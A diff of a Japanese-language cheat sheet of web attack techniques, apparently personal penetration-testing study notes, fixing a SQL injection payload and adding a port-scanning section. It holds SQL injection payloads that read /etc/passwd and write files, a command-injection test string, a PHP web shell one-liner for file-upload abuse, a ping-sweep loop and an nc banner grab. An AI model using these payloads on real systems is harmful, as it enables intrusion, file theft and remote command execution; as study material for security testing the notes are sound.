@@ -14,7 +14,7 @@
      2. 表示されるエラーからドキュメントルート等のディレクトリ情報がある場合がある。
      3. `' union select version() ; #` でdbのバージョン表示  *MariaDB
      4. `' union select load_file('/etc/passwd'); #`　で`/etc/passwd`のファイル内を表示
-     5. `' union select cloume_namefrom table_name into outfile '/data/mariadb/test.html' fields terminated by ',' optionally enclosed by '"'; #`でsqlの結果を/data/mariadb/test.htmlに出力(カンマ区切りで"で値を囲む)
+     5. `' union select column_name from table_name into outfile '/data/mariadb/test.html' fields terminated by ',' optionally enclosed by '"'; #`でsqlの結果を/data/mariadb/test.htmlに出力(カンマ区切りで"で値を囲む)
      6. `' union select table_name,column_name from information_schema.columns; #` でテーブル名とカラム名を取得
 * OS Command Injection
     1. 入力値のあとに`;ping -c 3 127.0.0.1`を入力して検証
@@ -49,3 +49,23 @@
     1. 入力を待ち受けできるphpファイルを作成しFile Uploadの脆弱性を利用しアップロード
     2. アップしたphpファイルを利用してweb経由でコマンド実行
         `<?php system($_GET["cmd"]); ?>`
+  * PortScan
+    1. ping sweet サンプル
+
+       ``` shell 
+       for i in {1..254}; do ping xxx.yyy.zzz.$i -c 1 -W 1 | grep ttl | cut -d ' ' -f 4 | tr -d ':' >> ip_list.txt & done
+       ```
+
+    2. pingのレスポンスの違い
+
+        | response | 状態                         |
+        | :------: | ---------------------------- |
+        | SYN,ACK  | IPが存在してPortが開いている |
+        | RST,ACK  | IPが存在してPortが閉じている |
+        |   None   | パケットがdropされている     |
+        |          | IPが存在しない               |
+        |          | タイムアウト |
+
+    3. バナーの取得
+      `printf "HEAD /index.html HTTP/1.0\r\n\r\n" | nc XXX.YYY.ZZZ.AAA`
+
